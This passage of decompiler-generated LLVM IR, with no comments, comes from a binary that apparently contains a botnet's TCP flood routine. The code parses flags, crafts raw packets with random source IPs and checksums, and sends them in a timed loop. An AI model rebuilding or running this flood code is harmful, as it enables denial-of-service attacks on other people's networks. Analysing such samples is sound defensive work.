  %v3_804ba8f = load i8, i8* %v2_804bb82, align 1
  %v4_804ba8f = zext i8 %v3_804ba8f to i32
  %v7_804ba8f = or i32 %v5_804ba79, %v4_804ba8f
  %v1_804ba92 = or i32 %v7_804ba8f, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ba92 = trunc i32 %v1_804ba92 to i8
  store i32 %v1_804ba92, i32* @edx, align 4
  store i8 %v3_804ba92, i8* %v2_804bb82, align 1
  br label %dec_label_pc_804bba6

dec_label_pc_804ba9d:                             ; preds = %dec_label_pc_804ba59
  store i32 %v4_804ba15, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba15, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80564bb.146 to i32), i32* @edi, align 4
  %v6_804bac1 = call i32 @_strncmp(i8* %v3_804bb95, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564bb.146, i32 0, i32 0), i32 4)
  %v7_804bac1 = urem i32 %v6_804bac1, 2
  %v8_804bac1 = icmp eq i32 %v7_804bac1, 0
  %v0_804bac3 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bac3 = or i1 %v0_804bac3, %v8_804bac1
  %v3_804bac3 = zext i1 %v2_804bac3 to i32
  %v4_804bac3 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bac3 = and i32 %v4_804bac3, -256
  %v6_804bac3 = or i32 %v3_804bac3, %v5_804bac3
  %v7_804bac3 = xor i32 %v6_804bac3, 1
  store i32 %v7_804bac3, i32* %edx.global-to-local, align 4
  %v3_804bac9 = and i32 %v6_804bac1, -256
  %v1_804bacb = trunc i32 %v7_804bac3 to i8
  %v3_804bacb = zext i1 %v0_804bac3 to i8
  %v4_804bacb = sub nsw i8 %v1_804bacb, %v3_804bacb
  %v15_804bacb = icmp eq i8 %v4_804bacb, 0
  %v20_804bacb = zext i8 %v4_804bacb to i32
  %v23_804bacb = or i32 %v20_804bacb, %v3_804bac9
  store i32 %v23_804bacb, i32* @ecx, align 4
  %v2_804bacf = sext i8 %v4_804bacb to i32
  store i32 %v2_804bacf, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bad4 = icmp eq i1 %v15_804bacb, false
  br i1 %v1_804bad4, label %dec_label_pc_804bae7, label %dec_label_pc_804bad6

dec_label_pc_804bad6:                             ; preds = %dec_label_pc_804ba9d
  store i32 %v1_804b914, i32* @eax, align 4
  %v3_804bad9 = load i8, i8* %v2_804bb82, align 1
  %v4_804bad9 = zext i8 %v3_804bad9 to i32
  %v7_804bad9 = or i32 %v5_804bac3, %v4_804bad9
  %v1_804badc = or i32 %v7_804bad9, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804badc = trunc i32 %v1_804badc to i8
  store i32 %v1_804badc, i32* @edx, align 4
  store i8 %v3_804badc, i8* %v2_804bb82, align 1
  br label %dec_label_pc_804bba6

dec_label_pc_804bae7:                             ; preds = %dec_label_pc_804ba9d
  store i32 %v4_804ba15, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba15, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80564bf.147 to i32), i32* @edi, align 4
  %v6_804bb17 = call i32 @_strncmp(i8* %v3_804bb95, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564bf.147, i32 0, i32 0), i32 4)
  %v7_804bb17 = urem i32 %v6_804bb17, 2
  %v8_804bb17 = icmp eq i32 %v7_804bb17, 0
  %v0_804bb19 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bb19 = or i1 %v0_804bb19, %v8_804bb17
  %v3_804bb19 = zext i1 %v2_804bb19 to i32
  %v4_804bb19 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bb19 = and i32 %v4_804bb19, -256
  %v6_804bb19 = or i32 %v3_804bb19, %v5_804bb19
  %v7_804bb19 = xor i32 %v6_804bb19, 1
  store i32 %v7_804bb19, i32* %edx.global-to-local, align 4
  %v3_804bb1f = and i32 %v6_804bb17, -256
  %v1_804bb21 = trunc i32 %v7_804bb19 to i8
  %v3_804bb21 = zext i1 %v0_804bb19 to i8
  %v4_804bb21 = sub nsw i8 %v1_804bb21, %v3_804bb21
  %v15_804bb21 = icmp eq i8 %v4_804bb21, 0
  %v20_804bb21 = zext i8 %v4_804bb21 to i32
  %v23_804bb21 = or i32 %v20_804bb21, %v3_804bb1f
  store i32 %v23_804bb21, i32* @ecx, align 4
  %v2_804bb25 = sext i8 %v4_804bb21 to i32
  store i32 %v2_804bb25, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bb2a = icmp eq i1 %v15_804bb21, false
  br i1 %v1_804bb2a, label %dec_label_pc_804bb3a, label %dec_label_pc_804bb2c

dec_label_pc_804bb2c:                             ; preds = %dec_label_pc_804bae7
  store i32 %v1_804b914, i32* @eax, align 4
  %v3_804bb2f = load i8, i8* %v2_804bb82, align 1
  %v4_804bb2f = zext i8 %v3_804bb2f to i32
  %v7_804bb2f = or i32 %v5_804bb19, %v4_804bb2f
  %v1_804bb32 = or i32 %v7_804bb2f, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804bb32 = trunc i32 %v1_804bb32 to i8
  store i32 %v1_804bb32, i32* @edx, align 4
  store i8 %v3_804bb32, i8* %v2_804bb82, align 1
  br label %dec_label_pc_804bba6

dec_label_pc_804bb3a:                             ; preds = %dec_label_pc_804bae7
  store i32 %v4_804ba15, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba15, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80564c3.148 to i32), i32* @edi, align 4
  %v6_804bb6a = call i32 @_strncmp(i8* %v3_804bb95, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564c3.148, i32 0, i32 0), i32 4)
  %v7_804bb6a = urem i32 %v6_804bb6a, 2
  %v8_804bb6a = icmp eq i32 %v7_804bb6a, 0
  %v0_804bb6c = load i1, i1* %cf.global-to-local, align 1
  %v2_804bb6c = or i1 %v0_804bb6c, %v8_804bb6a
  %v3_804bb6c = zext i1 %v2_804bb6c to i32
  %v4_804bb6c = load i32, i32* %edx.global-to-local, align 4
  %v5_804bb6c = and i32 %v4_804bb6c, -256
  %v6_804bb6c = or i32 %v3_804bb6c, %v5_804bb6c
  %v7_804bb6c = xor i32 %v6_804bb6c, 1
  store i32 %v7_804bb6c, i32* %edx.global-to-local, align 4
  %v3_804bb72 = and i32 %v6_804bb6a, -256
  %v1_804bb74 = trunc i32 %v7_804bb6c to i8
  %v3_804bb74 = zext i1 %v0_804bb6c to i8
  %v4_804bb74 = sub nsw i8 %v1_804bb74, %v3_804bb74
  %v15_804bb74 = icmp eq i8 %v4_804bb74, 0
  %v20_804bb74 = zext i8 %v4_804bb74 to i32
  %v23_804bb74 = or i32 %v20_804bb74, %v3_804bb72
  store i32 %v23_804bb74, i32* @ecx, align 4
  %v2_804bb78 = sext i8 %v4_804bb74 to i32
  store i32 %v2_804bb78, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bb7d = icmp eq i1 %v15_804bb74, false
  br i1 %v1_804bb7d, label %dec_label_pc_804bb8d, label %dec_label_pc_804bb7f

dec_label_pc_804bb7f:                             ; preds = %dec_label_pc_804bb3a
  store i32 %v1_804b914, i32* @eax, align 4
  %v3_804bb82 = load i8, i8* %v2_804bb82, align 1
  %v4_804bb82 = zext i8 %v3_804bb82 to i32
  %v7_804bb82 = or i32 %v5_804bb6c, %v4_804bb82
  %v1_804bb85 = or i32 %v7_804bb82, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804bb85 = trunc i32 %v1_804bb85 to i8
  store i32 %v1_804bb85, i32* @edx, align 4
  store i8 %v3_804bb85, i8* %v2_804bb82, align 1
  br label %dec_label_pc_804bba6

dec_label_pc_804bb8d:                             ; preds = %dec_label_pc_804bb3a
  %v0_804bb8d = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804bb8d, i32* %eax.global-to-local, align 4
  %v0_804bb92 = load i32, i32* @esp, align 4
  %v5_804bb92 = icmp ult i32 %v0_804bb92, 4
  store i1 %v5_804bb92, i1* %cf.global-to-local, align 1
  %v6_804bb95 = add i32 %v0_804bb92, -8
  %v7_804bb95 = inttoptr i32 %v6_804bb95 to i32*
  store i32 %v4_804ba15, i32* %v7_804bb95, align 4
  %v1_804bb98 = add i32 %v0_804bb92, -12
  %v2_804bb98 = inttoptr i32 %v1_804bb98 to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_80564c7.149 to i32), i32* %v2_804bb98, align 4
  %v0_804bb9d = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb9d = add i32 %v0_804bb92, -16
  %v3_804bb9d = inttoptr i32 %v2_804bb9d to i32*
  store i32 %v0_804bb9d, i32* %v3_804bb9d, align 4
  %v3_804bb9e = call i32 @Rootsprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_80564c3.148 to i32))
  store i32 %v3_804bb9e, i32* @eax, align 4
  %v0_804bba3 = load i32, i32* @esp, align 4
  %v2_804bba3 = icmp ugt i32 %v0_804bba3, -17
  store i1 %v2_804bba3, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804bba6

dec_label_pc_804bba6:                             ; preds = %dec_label_pc_804bb7f, %dec_label_pc_804bb2c, %dec_label_pc_804bad6, %dec_label_pc_804ba8c, %dec_label_pc_804ba48, %dec_label_pc_804bb8d
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804bb8d ], [ 4, %dec_label_pc_804bb7f ], [ %stack_var_-160.130, %dec_label_pc_804bb2c ], [ %stack_var_-160.130, %dec_label_pc_804bad6 ], [ %stack_var_-160.130, %dec_label_pc_804ba8c ], [ %stack_var_-160.130, %dec_label_pc_804ba48 ]
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564c3.148, i32 0, i32 0), %dec_label_pc_804bb8d ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564c3.148, i32 0, i32 0), %dec_label_pc_804bb7f ], [ %stack_var_-156.131, %dec_label_pc_804bb2c ], [ %stack_var_-156.131, %dec_label_pc_804bad6 ], [ %stack_var_-156.131, %dec_label_pc_804ba8c ], [ %stack_var_-156.131, %dec_label_pc_804ba48 ]
  %v0_804bba6 = load i32, i32* @esp, align 4
  %v5_804bba6 = icmp ult i32 %v0_804bba6, 8
  store i1 %v5_804bba6, i1* %cf.global-to-local, align 1
  %v1_804bba9 = add i32 %v0_804bba6, -12
  %v2_804bba9 = inttoptr i32 %v1_804bba9 to i32*
  store i32 ptrtoint (i32* @global_var_80564b1.143 to i32), i32* %v2_804bba9, align 4
  %v1_804bbae = add i32 %v0_804bba6, -16
  %v2_804bbae = inttoptr i32 %v1_804bbae to i32*
  store i32 0, i32* %v2_804bbae, align 4
  %v2_804bbb0 = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804bbb0 = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804bbb0)
  store i32 %v3_804bbb0, i32* %eax.global-to-local, align 4
  store i32 %v3_804bbb0, i32* %tmp104, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804bbbb = icmp eq i32 %v3_804bbb0, 0
  %v1_804bbbf = icmp eq i1 %v5_804bbbb, false
  %tmp105 = inttoptr i32 %v3_804bbb0 to i8*
  br i1 %v1_804bbbf, label %dec_label_pc_804ba15, label %dec_label_pc_804bbc5

dec_label_pc_804bbc5:                             ; preds = %dec_label_pc_804bba6, %dec_label_pc_804b9f9, %dec_label_pc_804b9b8
  %v0_804bbc5 = phi i8* [ %v0_804bbc5.pre, %dec_label_pc_804b9b8 ], [ %v5_804ba0d, %dec_label_pc_804b9f9 ], [ %tmp105, %dec_label_pc_804bba6 ]
  %v1_804bbc5 = ptrtoint i8* %v0_804bbc5 to i32
  %v2_804bbc5 = call i32 @rand_cmwc(i32 %v1_804bbc5)
  %sext9 = mul i32 %v2_804bbc5, 65536
  %v1_804bbca = sdiv i32 %sext9, 65536
  store i32 %v1_804bbca, i32* %edx.global-to-local, align 4
  %v1_804bbcf = trunc i32 %v1_804bbca to i16
  %v3_804bbcf = add i32 %v2_804b8fc, 34
  %v4_804bbcf = inttoptr i32 %v3_804bbcf to i16*
  store i16 %v1_804bbcf, i16* %v4_804bbcf, align 2
  %v1_804bbd6 = add i32 %v2_804b8fc, 36
  %v2_804bbd6 = inttoptr i32 %v1_804bbd6 to i16*
  store i16 0, i16* %v2_804bbd6, align 4
  store i32 %v1_804b914, i32* %eax.global-to-local, align 4
  %v1_804bbdf = add i32 %v2_804b8fc, 38
  %v2_804bbdf = inttoptr i32 %v1_804bbdf to i16*
  store i16 0, i16* %v2_804bbdf, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804b7eb, label %dec_label_pc_804bbf6, label %dec_label_pc_804bbeb

dec_label_pc_804bbeb:                             ; preds = %dec_label_pc_804bbc5
  %v0_804bbeb = load i8*, i8** %stack_var_-20, align 4
  %v1_804bbeb = ptrtoint i8* %v0_804bbeb to i32
  %v2_804bbeb = call i32 @rand_cmwc(i32 %v1_804bbeb)
  store i32 %v2_804bbeb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc0e

dec_label_pc_804bbf6:                             ; preds = %dec_label_pc_804bbc5
  %v1_804bbf9 = urem i32 %arg2, 65536
  store i32 %v1_804bbf9, i32* %eax.global-to-local, align 4
  %v0_804bbfe = load i32, i32* @esp, align 4
  %v5_804bbfe = icmp ult i32 %v0_804bbfe, 12
  store i1 %v5_804bbfe, i1* %cf.global-to-local, align 1
  %v2_804bc01 = add i32 %v0_804bbfe, -16
  %v3_804bc01 = inttoptr i32 %v2_804bc01 to i32*
  store i32 %v1_804bbf9, i32* %v3_804bc01, align 4
  %v1_804bc02 = sext i16 %tmp48 to i32
  %v2_804bc02 = call i32 @htons(i32 %v1_804bc02)
  store i32 %v2_804bc02, i32* %eax.global-to-local, align 4
  %v0_804bc07 = load i32, i32* @esp, align 4
  %v2_804bc07 = icmp ugt i32 %v0_804bc07, -17
  store i1 %v2_804bc07, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804bc0e

dec_label_pc_804bc0e:                             ; preds = %dec_label_pc_804bbeb, %dec_label_pc_804bbf6
  %storemerge.in = phi i32 [ %v2_804bc02, %dec_label_pc_804bbf6 ], [ %v2_804bbeb, %dec_label_pc_804bbeb ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804b914, i32* %eax.global-to-local, align 4
  %v4_804bc11 = urem i32 %storemerge.in, 65536
  %v5_804bc11 = load i32, i32* @esi, align 4
  %v6_804bc11 = and i32 %v5_804bc11, -65536
  %v7_804bc11 = or i32 %v6_804bc11, %v4_804bc11
  store i32 %v7_804bc11, i32* @esi, align 4
  %v3_804bc15 = add i32 %v2_804b8fc, 22
  %v4_804bc15 = inttoptr i32 %v3_804bc15 to i16*
  store i16 %storemerge, i16* %v4_804bc15, align 2
  %v0_804bc19 = load i32, i32* @esp, align 4
  %v5_804bc19 = icmp ult i32 %v0_804bc19, 8
  store i1 %v5_804bc19, i1* %cf.global-to-local, align 1
  %v6_804bc1c = add i32 %v0_804bc19, -12
  %v7_804bc1c = inttoptr i32 %v6_804bc1c to i32*
  store i32 %v1_804b914, i32* %v7_804bc1c, align 4
  %v5_804bc1f = add i32 %v0_804bc19, -16
  %v6_804bc1f = inttoptr i32 %v5_804bc1f to i32*
  store i32 %v2_804b8fc, i32* %v6_804bc1f, align 4
  %v0_804bc22 = call i32 @tcpcsum()
  %v1_804bc22 = trunc i32 %v0_804bc22 to i16
  %sext14 = mul i32 %v0_804bc22, 65536
  %v1_804bc2a = sdiv i32 %sext14, 65536
  store i32 %v1_804bc2a, i32* %edx.global-to-local, align 4
  store i16 %v1_804bc22, i16* %v2_804bbd6, align 4
  store i32 %v2_804b8fc, i32* %eax.global-to-local, align 4
  %v1_804bc36 = or i32 %v2_804b8fc, 2
  %v2_804bc36 = inttoptr i32 %v1_804bc36 to i16*
  %v3_804bc36 = load i16, i16* %v2_804bc36, align 2
  %v4_804bc36 = zext i16 %v3_804bc36 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804bc36, i32* %edx.global-to-local, align 4
  store i32 %v2_804b8fc, i32* %eax.global-to-local, align 4
  %v1_804bc45 = load i32, i32* @esp, align 4
  %v2_804bc45 = add i32 %v1_804bc45, -4
  %v3_804bc45 = inttoptr i32 %v2_804bc45 to i32*
  store i32 %v4_804bc36, i32* %v3_804bc45, align 4
  %v0_804bc46 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bc46 = add i32 %v1_804bc45, -8
  %v3_804bc46 = inttoptr i32 %v2_804bc46 to i32*
  store i32 %v0_804bc46, i32* %v3_804bc46, align 4
  %sext15 = mul i32 %storemerge.in, 65536
  %v1_804bc47 = sdiv i32 %sext15, 65536
  %v3_804bc47 = inttoptr i32 %v1_804bc47 to i16*
  %v4_804bc47 = call i32 @csum(i16* %v3_804bc47, i32 ptrtoint (i32* @0 to i32))
  %v5_804bc47 = trunc i32 %v4_804bc47 to i16
  %sext16 = mul i32 %v4_804bc47, 65536
  %v1_804bc4f = sdiv i32 %sext16, 65536
  store i32 %v1_804bc4f, i32* %edx.global-to-local, align 4
  store i32 %v2_804b8fc, i32* %eax.global-to-local, align 4
  %v3_804bc54 = or i32 %v2_804b8fc, 10
  %v4_804bc54 = inttoptr i32 %v3_804bc54 to i16*
  store i16 %v5_804bc47, i16* %v4_804bc54, align 2
  %v0_804bc58 = load i32, i32* @esp, align 4
  %v5_804bc58 = icmp ult i32 %v0_804bc58, 12
  store i1 %v5_804bc58, i1* %cf.global-to-local, align 1
  %v1_804bc5b = add i32 %v0_804bc58, -16
  %v2_804bc5b = inttoptr i32 %v1_804bc5b to i32*
  store i32 0, i32* %v2_804bc5b, align 4
  %v2_804bc5d = inttoptr i32 %v1_804bc47 to i32*
  %v3_804bc5d = call i32 @__GI_time(i32* %v2_804bc5d)
  %v0_804bc62 = load i32, i32* @esp, align 4
  %v1_804bc62 = add i32 %v0_804bc62, 16
  %v5_804bc65 = add i32 %v3_804bc5d, %arg3
  %v10_804bc65 = icmp ult i32 %v5_804bc65, %v3_804bc5d
  store i1 %v10_804bc65, i1* %cf.global-to-local, align 1
  store i32 %v5_804bc65, i32* %eax.global-to-local, align 4
  %v2_804bcb0 = or i32 %v2_804b8fc, 12
  %v3_804bcb0 = inttoptr i32 %v2_804bcb0 to i32*
  %v3_804bcbd = or i32 %v2_804b8fc, 4
  %v4_804bcbd = inttoptr i32 %v3_804bcbd to i16*
  br label %dec_label_pc_804bc74

dec_label_pc_804bc74:                             ; preds = %dec_label_pc_804bd2b, %dec_label_pc_804bd49, %dec_label_pc_804bc0e
  %v0_804bc7a = phi i32 [ %v1_804bc62, %dec_label_pc_804bc0e ], [ %v0_804bc7a.pre.pre, %dec_label_pc_804bd49 ], [ %v1_804bd35, %dec_label_pc_804bd2b ]
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804bc0e ], [ %v4_804bd49, %dec_label_pc_804bd49 ], [ 0, %dec_label_pc_804bd2b ]
  store i32 %v2_804b813, i32* %eax.global-to-local, align 4
  store i32 %v2_804b8fc, i32* %edx.global-to-local, align 4
  %v5_804bc7a = icmp ult i32 %v0_804bc7a, 8
  store i1 %v5_804bc7a, i1* %cf.global-to-local, align 1
  %v1_804bc7d = add i32 %v0_804bc7a, -12
  %v2_804bc7d = inttoptr i32 %v1_804bc7d to i32*
  store i32 16, i32* %v2_804bc7d, align 4
  %v2_804bc7f = add i32 %v0_804bc7a, -16
  %v3_804bc7f = inttoptr i32 %v2_804bc7f to i32*
  store i32 %v2_804b813, i32* %v3_804bc7f, align 4
  %v1_804bc80 = add i32 %v0_804bc7a, -20
  %v2_804bc80 = inttoptr i32 %v1_804bc80 to i32*
  store i32 0, i32* %v2_804bc80, align 4
  %v5_804bc82 = add i32 %v0_804bc7a, -24
  %v6_804bc82 = inttoptr i32 %v5_804bc82 to i32*
  store i32 %v1_804b8dc, i32* %v6_804bc82, align 4
  %v0_804bc85 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bc85 = add i32 %v0_804bc7a, -28
  %v3_804bc85 = inttoptr i32 %v2_804bc85 to i32*
  store i32 %v0_804bc85, i32* %v3_804bc85, align 4
  %v5_804bc86 = add i32 %v0_804bc7a, -32
  %v6_804bc86 = inttoptr i32 %v5_804bc86 to i32*
  store i32 %v4_804b84a, i32* %v6_804bc86, align 4
  %v1_804bc89 = load i32, i32* %stack_var_-64, align 4
  %v2_804bc89 = load i32, i32* %stack_var_-60, align 4
  %v3_804bc89 = load i32, i32* %stack_var_-56, align 4
  %v4_804bc89 = load i32, i32* %stack_var_-52, align 4
  %v6_804bc89 = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804bc89, i32 %v2_804bc89, i32 %v3_804bc89, i32 %v4_804bc89, i32 0)
  store i32 %v6_804bc89, i32* %eax.global-to-local, align 4
  %v0_804bc8e = load i32, i32* @esp, align 4
  %v1_804bc8e = add i32 %v0_804bc8e, 32
  %v5_804bc91 = icmp ult i32 %v1_804bc8e, 12
  store i1 %v5_804bc91, i1* %cf.global-to-local, align 1
  %v5_804bc94 = add i32 %v0_804bc8e, 16
  %v6_804bc94 = inttoptr i32 %v5_804bc94 to i32*
  store i32 %storemerge13, i32* %v6_804bc94, align 4
  %v1_804bc97 = load i32, i32* %stack_var_-64, align 4
  %v2_804bc97 = call i32 @GetRandomIP(i32 %stack_var_-68.0, i32 %v1_804bc97)
  store i32 %v2_804bc97, i32* %eax.global-to-local, align 4
  %v0_804bc9c = load i32, i32* @esp, align 4
  %v1_804bc9c = add i32 %v0_804bc9c, 16
  %v5_804bc9f = icmp ult i32 %v1_804bc9c, 12
  store i1 %v5_804bc9f, i1* %cf.global-to-local, align 1
  %v3_804bca2 = inttoptr i32 %v0_804bc9c to i32*
  store i32 %v2_804bc97, i32* %v3_804bca2, align 4
  %v0_804bca3 = call i32 @htonl()
  %v0_804bca8 = load i32, i32* @esp, align 4
  %v2_804bca8 = icmp ugt i32 %v0_804bca8, -17
  store i1 %v2_804bca8, i1* %cf.global-to-local, align 1
  store i32 %v0_804bca3, i32* %edx.global-to-local, align 4
  store i32 %v2_804b8fc, i32* %eax.global-to-local, align 4
  store i32 %v0_804bca3, i32* %v3_804bcb0, align 4
  %v1_804bcb3 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext10 = mul i32 %v1_804bcb3, 65536
  %v1_804bcb8 = sdiv i32 %sext10, 65536
  store i32 %v1_804bcb8, i32* %edx.global-to-local, align 4
  store i32 %v2_804b8fc, i32* %eax.global-to-local, align 4
  %v1_804bcbd = trunc i32 %v1_804bcb8 to i16
  store i16 %v1_804bcbd, i16* %v4_804bcbd, align 4
  %v1_804bcc1 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804bcc1, i32* %edx.global-to-local, align 4
  store i32 %v1_804b914, i32* %eax.global-to-local, align 4
  store i32 %v1_804bcc1, i32* %v3_804b969, align 8
  %v1_804bcce = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext11 = mul i32 %v1_804bcce, 65536
  %v1_804bcd3 = sdiv i32 %sext11, 65536
  store i32 %v1_804bcd3, i32* %edx.global-to-local, align 4
  %v1_804bcd8 = trunc i32 %v1_804bcd3 to i16
  store i16 %v1_804bcd8, i16* %v5_804b917, align 4
  store i32 %v1_804b914, i32* %eax.global-to-local, align 4
  store i16 0, i16* %v2_804bbd6, align 4
  %v0_804bce4 = load i32, i32* @esp, align 4
  %v5_804bce4 = icmp ult i32 %v0_804bce4, 8
  store i1 %v5_804bce4, i1* %cf.global-to-local, align 1
  %v6_804bce7 = add i32 %v0_804bce4, -12
  %v7_804bce7 = inttoptr i32 %v6_804bce7 to i32*
  store i32 %v1_804b914, i32* %v7_804bce7, align 4
  %v5_804bcea = add i32 %v0_804bce4, -16
  %v6_804bcea = inttoptr i32 %v5_804bcea to i32*
  store i32 %v2_804b8fc, i32* %v6_804bcea, align 4
  %v0_804bced = call i32 @tcpcsum()
  %v1_804bced = trunc i32 %v0_804bced to i16
  %sext18 = mul i32 %v0_804bced, 65536
  %v1_804bcf5 = sdiv i32 %sext18, 65536
  store i32 %v1_804bcf5, i32* %edx.global-to-local, align 4
  store i16 %v1_804bced, i16* %v2_804bbd6, align 4
  store i32 %v2_804b8fc, i32* %eax.global-to-local, align 4
  %v3_804bd01 = load i16, i16* %v2_804bc36, align 2
  %v4_804bd01 = zext i16 %v3_804bd01 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804bd01, i32* %edx.global-to-local, align 4
  store i32 %v2_804b8fc, i32* %eax.global-to-local, align 4
  %v1_804bd10 = load i32, i32* @esp, align 4
  %v2_804bd10 = add i32 %v1_804bd10, -4
  %v3_804bd10 = inttoptr i32 %v2_804bd10 to i32*
  store i32 %v4_804bd01, i32* %v3_804bd10, align 4
  %v0_804bd11 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bd11 = add i32 %v1_804bd10, -8
  %v3_804bd11 = inttoptr i32 %v2_804bd11 to i32*
  store i32 %v0_804bd11, i32* %v3_804bd11, align 4
  %v1_804bd12 = load i32, i32* %stack_var_-64, align 4
  %v2_804bd12 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804bd12 = call i32 @csum(i16* %v2_804bd12, i32 %v1_804bd12)
  %v4_804bd12 = trunc i32 %v3_804bd12 to i16
  %sext19 = mul i32 %v3_804bd12, 65536
  %v1_804bd1a = sdiv i32 %sext19, 65536
  store i32 %v1_804bd1a, i32* %edx.global-to-local, align 4
  store i32 %v2_804b8fc, i32* %eax.global-to-local, align 4
  store i16 %v4_804bd12, i16* %v4_804bc54, align 2
  store i32 %arg7, i32* @edi, align 4
  %v10_804bd26 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804bd26, i1* %cf.global-to-local, align 1
  %v15_804bd26 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804bd29 = icmp eq i1 %v15_804bd26, false
  br i1 %v1_804bd29, label %dec_label_pc_804bd49, label %dec_label_pc_804bd2b

dec_label_pc_804bd2b:                             ; preds = %dec_label_pc_804bc74
  %v0_804bd2b = load i32, i32* @esp, align 4
  %v5_804bd2b = icmp ult i32 %v0_804bd2b, 12
  store i1 %v5_804bd2b, i1* %cf.global-to-local, align 1
  %v1_804bd2e = add i32 %v0_804bd2b, -16
  %v2_804bd2e = inttoptr i32 %v1_804bd2e to i32*
  store i32 0, i32* %v2_804bd2e, align 4
  %v1_804bd30 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804bd30 = call i32 @__GI_time(i32* %v1_804bd30)
  store i32 %v2_804bd30, i32* %eax.global-to-local, align 4
  %v0_804bd35 = load i32, i32* @esp, align 4
  %v1_804bd35 = add i32 %v0_804bd35, 16
  %v10_804bd38 = icmp ult i32 %v2_804bd30, %v5_804bc65
  store i1 %v10_804bd38, i1* %cf.global-to-local, align 1
  %v8_804bd3b = icmp sgt i32 %v2_804bd30, %v5_804bc65
  br i1 %v8_804bd3b, label %dec_label_pc_804bd51, label %dec_label_pc_804bc74

dec_label_pc_804bd49:                             ; preds = %dec_label_pc_804bc74
  %v4_804bd49 = add i32 %stack_var_-68.0, 1
  %v0_804bc7a.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bc74

dec_label_pc_804bd51:                             ; preds = %dec_label_pc_804bd2b, %dec_label_pc_804b810, %dec_label_pc_804b899, %dec_label_pc_804b85b
  %v0_804bd5b = phi i32 [ %v4_804b81d, %dec_label_pc_804b810 ], [ %v3_804b8a7, %dec_label_pc_804b899 ], [ %v3_804b869, %dec_label_pc_804b85b ], [ %v2_804bd30, %dec_label_pc_804bd2b ]
  store i32 %v0_804b7cf, i32* @ebx, align 4
  store i32 %v0_804b7ce, i32* @esi, align 4
  ret i32 %v0_804bd5b

; uselistorder directives
  uselistorder i32 %v2_804bd30, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804bcd3, { 1, 0 }
  uselistorder i32 %v1_804bcb8, { 1, 0 }
  uselistorder i32 %v0_804bca3, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_804bc7a, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_804bc65, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804bc5d, { 1, 0 }
  uselistorder i32 %v1_804bc47, { 1, 0 }
  uselistorder i32 %v1_804bbf9, { 1, 0 }
  uselistorder i32 %v1_804bbca, { 1, 0 }
  uselistorder i32 %v3_804bbb0, { 2, 1, 0, 3 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i32 %v1_804bb85, { 1, 0 }
  uselistorder i1 %v0_804bb6c, { 1, 0 }
  uselistorder i32 %v6_804bb6a, { 1, 0 }
  uselistorder i32 %v1_804bb32, { 1, 0 }
  uselistorder i1 %v0_804bb19, { 1, 0 }
  uselistorder i32 %v6_804bb17, { 1, 0 }
  uselistorder i32 %v1_804badc, { 1, 0 }
  uselistorder i1 %v0_804bac3, { 1, 0 }
  uselistorder i32 %v6_804bac1, { 1, 0 }
  uselistorder i32 %v1_804ba92, { 1, 0 }
  uselistorder i1 %v0_804ba79, { 1, 0 }
  uselistorder i32 %v6_804ba77, { 1, 0 }
